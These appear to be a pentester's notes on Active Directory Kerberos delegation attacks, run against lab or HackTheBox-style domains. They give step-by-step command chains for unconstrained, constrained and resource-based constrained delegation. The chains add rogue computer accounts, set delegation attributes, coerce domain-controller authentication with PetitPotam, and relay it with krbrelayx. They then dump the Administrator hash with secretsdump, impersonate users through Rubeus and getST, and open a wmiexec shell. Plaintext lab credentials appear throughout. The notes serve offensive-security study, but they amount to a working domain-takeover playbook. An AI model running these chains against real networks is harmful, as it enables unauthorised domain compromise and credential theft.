# Delegation

## 2. Unconstrained Delegation

### 2.2 Enumeration

```powershell
Import-Module .\PowerView.ps1

# PowerView
Get-DomainComputer -Unconstrained | Select-Object samaccountname, distinguishedname
Get-DomainUser -Unconstrained | Select-Object samaccountname, distinguishedname

# Native AD module
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation, dNSHostName
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

whoami /all
SeEnableDelegationPrivilege
```

### 2.4 Attack Chain

```powershell
 impacket-addcomputer -dc-ip 10.129.234.69 -computer-name pwn delegate.vl/N.Thompson:'KALEB_2341'

bloodyAD -u 'N.Thompson' -d 'delegate.vl' -p 'KALEB_2341' --host '10.129.234.69' add uac 'pwn$' -f TRUSTED_FOR_DELEGATION

python3 ./krbrelayx/dnstool.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -r pwn.delegate.vl -d 10.10.15.254 --action add 10.129.234.69

python3 ./krbrelayx/addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/pwn' -t 'pwn$' -dc-ip 10.129.234.69 10.129.234.69

bloodyAD -d delegate.vl --dc-ip 10.129.234.69 -u 'N.Thompson' -p 'KALEB_2341' get object 'pwn$' --attr 'servicePrincipalName'

dig pwn.delegate.vl @10.129.234.69

python3 -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4","9k3VxHcDZZCRlE2zmqbhI1ntJPULRxyX".encode("utf16le")).digest()).decode())'

python3 ./krbrelayx/krbrelayx.py -hashes :868cc835d19a9e9ffb7adbc0b2f6ef4f

python3 PetitPotam.py -target-ip 10.129.234.69 -u 'pwn$' -p '9k3VxHcDZZCRlE2zmqbhI1ntJPULRxyX' pwn dc1.delegate.vl

KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache impacket-secretsdump -just-dc-user Administrator -k dc1.delegate.vl
```

---

## 3. Constrained Delegation with Protocol Transition (S4U2Self + S4U2Proxy)

```
python3 /home/sako/Tools/Impacket/examples/getTGT.py redelegate.vl/'FS01$':'sako2005!' -dc-ip 10.129.30.71
export KRB5CCNAME=FS01\$.ccache
klist

python3 /home/sako/Tools/bloodyAD/bloodyAD.py -d redelegate.vl -u helen.frost -p 'sako2005!' --host dc.redelegate.vl add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION

python3 /home/sako/Tools/bloodyAD/bloodyAD.py -d redelegate.vl -u helen.frost -p 'sako2005!' --host dc.redelegate.vl set object 'FS01$' msDS-AllowedToDelegateTo -v 'cifs/dc.redelegate.vl' -v 'ldap/dc.redelegate.vl'

python3 /home/sako/Tools/bloodyAD/bloodyAD.py -d redelegate.vl -u helen.frost -p 'sako2005!' --host dc.redelegate.vl get object 'FS01$' --attr msDS-AllowedToDelegateTo
python3 /home/sako/Tools/bloodyAD/bloodyAD.py -d redelegate.vl -u helen.frost -p 'sako2005!' --host dc.redelegate.vl get object RYAN.COOPER --attr userAccountControl

python3 /home/sako/Tools/Impacket/examples/getST.py -spn cifs/dc.redelegate.vl -impersonate ryan.cooper redelegate.vl/'FS01$':'sako2005!' -dc-ip 10.129.30.71

export KRB5CCNAME=ryan.cooper.ccache
python3 /home/sako/Tools/Impacket/examples/wmiexec.py -k -no-pass dc.redelegate.vl
```

---

## 4. Constrained Delegation without Protocol Transition (Use Kerberos only)

### 4.2 Enumeration

```powershell
Import-Module .\PowerView.ps1

# PowerView - accounts with delegation targets but NOT Protocol Transition
Get-DomainUser -AllowDelegation | Where-Object { $_.useraccountcontrol -notmatch "TRUSTED_TO_AUTH_FOR_DELEGATION" } | `
    Select-Object samaccountname, msds-allowedtodelegateto

# Native AD module
Get-ADUser -Filter {msDS-AllowedToDelegateTo -like "*" -and TrustedToAuthForDelegation -eq $false} `
    -Properties msDS-AllowedToDelegateTo, TrustedToAuthForDelegation, ServicePrincipalName
```

### 4.4 Observing the Restriction

```powershell
# Obtain the NTLM hash
.\Rubeus.exe hash /password:sako2005! /user:constrained-svc /domain:warzone.oxsium.local

# Attempting to impersonate Administrator will fail at S4U2Proxy
# because the S4U2Self ticket is not forwardable
.\Rubeus.exe s4u /user:constrained-svc /rc4:BURAYA_RC4_HASH `
    /impersonateuser:Administrator `
    /msdsspn:CIFS/WIN-WARZONE.warzone.oxsium.local `
    /ptt
```

---

## 5. Resource-Based Constrained Delegation (RBCD)

### 5.2 Enumeration

```powershell
Import-Module .\PowerView.ps1

# PowerView - find objects with RBCD already configured
Get-DomainComputer -Properties name, msds-allowedtoactonbehalfofotheridentity | `
    Where-Object { $_.'msds-allowedtoactonbehalfofotheridentity' }

# Native AD module
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | `
    Where-Object { $_.'msDS-AllowedToActOnBehalfOfOtherIdentity' }

# Check the current user's MachineAccountQuota (how many computer objects they can create)
Get-ADObject (Get-ADDomain).DistinguishedName -Properties ms-DS-MachineAccountQuota

# Find objects where a controlled principal has GenericAll/GenericWrite (BloodHound covers this more thoroughly)
Get-DomainObjectAcl -Identity "RBCD-PC" -ResolveGUIDs | `
    Where-Object { $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty" }
```

### 5.3 Lab Setup — Target Object

```powershell
Import-Module ActiveDirectory

# Target computer account - under the Delegation OU
New-ADComputer -Name "RBCD-PC" -SAMAccountName "RBCD-PC" -Enabled $true `
    -Path "OU=Delegation,DC=warzone,DC=oxsium,DC=local"

# Manually add the CIFS SPN (it doesn't register automatically since this isn't a real domain-joined computer)
setspn -A CIFS/RBCD-PC.warzone.oxsium.local RBCD-PC$

# Check - TrustedForDelegation is False, msDS-AllowedToActOnBehalfOfOtherIdentity is empty, SPN is present
Get-ADComputer -Identity "RBCD-PC" -Properties TrustedForDelegation, msDS-AllowedToActOnBehalfOfOtherIdentity, ServicePrincipalName
setspn -L RBCD-PC$
```

### 5.4 Attack Chain — Attacker-Controlled Object

```powershell
Import-Module .\PowerView.ps1

# 1. Create an attacker-controlled computer account (run as lowpriv-user to simulate the real scenario)
$ComputerName = "EVIL-PC"
$Password = ConvertTo-SecureString "Ev1lP@ss123!" -AsPlainText -Force

New-ADComputer -Name $ComputerName -SAMAccountName "$ComputerName`$" `
    -AccountPassword $Password -Enabled $true `
    -Path "OU=Delegation,DC=warzone,DC=oxsium,DC=local"

# 2. Resolve EVIL-PC$'s SID
$evilSID = Convert-NameToSid EVIL-PC$

# 3. Point RBCD-PC's msDS-AllowedToActOnBehalfOfOtherIdentity at EVIL-PC$
Set-ADComputer -Identity "RBCD-PC" -PrincipalsAllowedToDelegateToAccount "EVIL-PC$"

# 4. Verify
$rbcd = Get-ADComputer -Identity "RBCD-PC" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
$rbcd.'msDS-AllowedToActOnBehalfOfOtherIdentity'.Access

# 5. Convert EVIL-PC$'s password to an NTLM hash
.\Rubeus.exe hash /password:Ev1lP@ss123! /user:EVIL-PC$ /domain:warzone.oxsium.local

# 6. Full S4U chain: impersonate Administrator against RBCD-PC's CIFS service
.\Rubeus.exe s4u /user:EVIL-PC$ /rc4:BURAYA_RC4_HASH `
    /impersonateuser:Administrator `
    /msdsspn:CIFS/RBCD-PC.warzone.oxsium.local `
    /domain:warzone.oxsium.local `
    /ptt

# 7. Verify access
klist
ls \\RBCD-PC.warzone.oxsium.local\C$
```
